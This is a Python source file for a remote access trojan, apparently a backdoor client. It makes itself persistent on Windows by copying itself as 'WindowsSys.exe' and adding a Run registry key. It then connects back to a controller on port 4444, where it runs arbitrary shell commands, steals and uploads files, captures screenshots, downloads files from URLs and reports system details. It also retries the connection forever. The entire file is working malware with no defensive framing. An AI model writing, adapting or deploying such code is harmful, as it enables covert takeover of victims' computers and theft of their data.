
try :

	import socket
	import sys
	import os
	import subprocess
	import random
	import platform
	import time
	import shutil
	import urllib.request

except :
	
	sys.exit()

try :
 
	import pyautogui
 
except :
 
	os.system("pip3 install pyautogui")
 
if platform.system().startswith("Linux") :
 
	red = '\033[91m'
	green = '\033[92m'
	yellow = '\033[93m'
	blue = '\033[94m'
	endc = '\033[0m'
	underline = '\033[4m'
 
else :

	red = ''
	green = ''
	yellow = ''
	blue = ''
	endc = ''
	underline = ''

def Persistence () :

	try :

		if platform.system().startswith("Win") :

			Location = os.environ["appdata"] + "\\WindowsSys.exe"

			if not os.path.exists(location) :

				shutil.copyfile(sys.executable , Location)

			else :

				pass

			os.system("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSys /t REG_SZ /d {}".format(Location))

		else :

			pass

	except Exception :

		pass

def main () : 

	try :

		def Socket_Creation():
				 
			try :
				 
				global Host
				global Port
				global s
				 
				s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
				s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
				s.setblocking(1)
				
				Host , Port = "0.0.0.0" , 4444
				 
			except socket.error as e :
				
				pass
				 
		def Socket_Connection():
				 
			try :
				 
				s.connect((Host , Port))
				 
			except socket.error as e :
				
				pass

		if __name__ == '__main__':

			Persistence ()
			Socket_Creation()
			Socket_Connection()
				 
		while True :
				 
			Received_Data = s.recv(208400)
			Decode_Received_Data = Received_Data.decode()
		 
			def Current_Working_Directory () :
		 
				Cwd = os.getcwd()
				s.send(str.encode(Cwd))
		 
			def Connection_Exit () :
		 
				s.close()
				sys.exit()
		 
			def Info () :
		 
				_Node = platform.node()
				_Machine = platform.machine()
				_System = platform.system()
				_Release = platform.release()
				_Version = platform.version()
				_Architecture = str(platform.architecture()[0])
				_Language = str(os.getenv("LANG").split(".")[0])
				s.send(_Node.encode())
				time.sleep(0.5)
				s.send(_Machine.encode())
				time.sleep(0.5)
				s.send(_System.encode())
				time.sleep(0.5)
				s.send(_Release.encode())
				time.sleep(0.5)
				s.send(_Version.encode())
				time.sleep(0.5)
				s.send(_Architecture.encode())
				time.sleep(0.5)
				s.send(_Language.encode())
		 
			def Url_Download () :
		 
				Sent_Command = "[+] Command Received"
				s.send(Sent_Command.encode())
				Received_Url = s.recv(208400)
				Decode_Received_Url = Received_Url.decode()
				File_Name = Decode_Received_Url.split("/")[-1]
		 
				try :
		 
					Url_Open = urllib.request.urlopen(Decode_Received_Url)
		 
					with open(File_Name , mode = "wb") as _File :
						
						_File.write(Url_Open.read())
		 
					if os.path.isfile(File_Name) and os.access(File_Name , os.F_OK) :
		 
						time.sleep(1)
						Checked_Path = "File Has Been Downloaded Over This Url"
						s.send(Checked_Path.encode())
		 
					else :
		 
						Checked_Path = "Error File Has Not been Downloaded Correctly"
						s.send(Checked_Path.encode())
		 
				except :
		 
					Error_Opened_Error = "Failed To Open This Url"
					s.send(Error_Opened_Error.encode())
		 
			def Download () :
		 
				Sent_Command = "[+] Command Received"
				s.send(Sent_Command.encode())
		 
				File_Path = s.recv(208400)
				Decode_File_Path = File_Path.decode()
		 
				if os.access(Decode_File_Path , os.F_OK) and os.path.isfile(Decode_File_Path) :
		 
					Path_Confirmation = "Path Found"
					s.send(Path_Confirmation.encode())
		 
					with open (Decode_File_Path , mode = "rb") as _File :
						
						Downloaded_File = _File.read(1024)
						
						while Downloaded_File :
							
							s.send(Downloaded_File)
							Downloaded_File = _File.read(1024)

						time.sleep(4)

						Finish_Download = "Finish"
						s.send(str.encode(Finish_Download))
		 
				else :
		 
					Path_Confirmation = "Path Not Found"
					s.send(Path_Confirmation.encode())

			def Upload () :

				Sent_Command = "[+] Command Received"
				s.send(Sent_Command.encode())

				Save_As = s.recv(208400)
				Decode_Save_As = Save_As.decode()

				if os.path.isdir(Decode_Save_As) :

					if platform.system().startswith("Linux") :

						Decode_Save_As = Decode_Save_As + "/" + "Upload" + str(random.randint(1 , 1000))

					else :

						Decode_Save_As = Decode_Save_As + "\\" + "Upload" + str(random.randint(1 , 1000))

				else :

					pass

				with open(Decode_Save_As , mode = "wb" ) as _File :

					Uploaded_File = s.recv(1024)

					while Uploaded_File :

						_File.write(Uploaded_File)
						Uploaded_File = s.recv(1024)

						if Uploaded_File == b"Finish" :

							break

				if os.access(Decode_Save_As , os.F_OK) and os.path.isfile(Decode_Save_As) :

					File_Uploaded = "File Uploaded"
					s.send(File_Uploaded.encode())

				else :

					File_Not_Uploaded = "File Not Uploaded"
					s.send(File_Not_Uploaded.encode())

			def Screenshot_Capture () :
				 
				Sent_Command = "[+] Command Received"
				s.send(Sent_Command.encode())
				RandomNum = random.randint(1 , 1000)
				File_Name = "Screenshot_" + str(RandomNum)
				
				pyautogui.screenshot(File_Name)

				time.sleep(0.5)

				with open(File_Name , mode = "rb") as _File :

					_Screenshot = _File.read(1024)

					while _Screenshot :

						s.send(_Screenshot)
						_Screenshot = _File.read(1024)

					time.sleep(2)
					
					Finish_Download = "Finish"
					s.send(str.encode(Finish_Download))

					time.sleep(5)
					os.remove(File_Name)
		 
			def Interactive_Shell () :
				 
				Command_File_Descriptor = subprocess.Popen( Decode_Received_Data
					, shell = True
					, stdin = subprocess.PIPE
					, stdout = subprocess.PIPE
					, stderr = subprocess.PIPE )

				Output_Bytes = Command_File_Descriptor.stdout.read()  + Command_File_Descriptor.stderr.read()
				Output_String = str(Output_Bytes , "utf-8")

				Cwd = red + " __[- " + endc + green + socket.gethostname() + endc + red + " -]" + endc + yellow + "~-~" + endc + red + "[" + endc + green + os.getcwd() + endc + red + "]" + red +"\n|__" + endc        
				s.send(str.encode(endc + "\n" + Output_String + "\n" + green + Cwd))
		 
			try :
				 
				if Decode_Received_Data[:2] == "cd" :
					os.chdir(Decode_Received_Data[3:])
				 
			except Exception  :
			   
				pass
		 
			if Decode_Received_Data == "exit" or Decode_Received_Data == "quit" :
				   
					Connection_Exit ()
				 
			elif Decode_Received_Data == "cwd" :
				 
				Current_Working_Directory ()
				   
			elif Decode_Received_Data == "screenshot":
			   
				Screenshot_Capture ()
		 
			elif Decode_Received_Data == "url download" :
		 
				Url_Download ()
		 
			elif Decode_Received_Data == "download" :
		 
				Download ()

			elif Decode_Received_Data == "upload" :

				Upload ()

			elif Decode_Received_Data == "sysinfo" :
		 
				Info ()
				 
			else :
			   
				Interactive_Shell ()

	except Exception as e :

		while True :
			
			time.sleep(5)
			main ()

	except KeyboardInterrupt :

		sys.exit()
try :

	main ()

except KeyboardInterrupt :

	sys.exit()
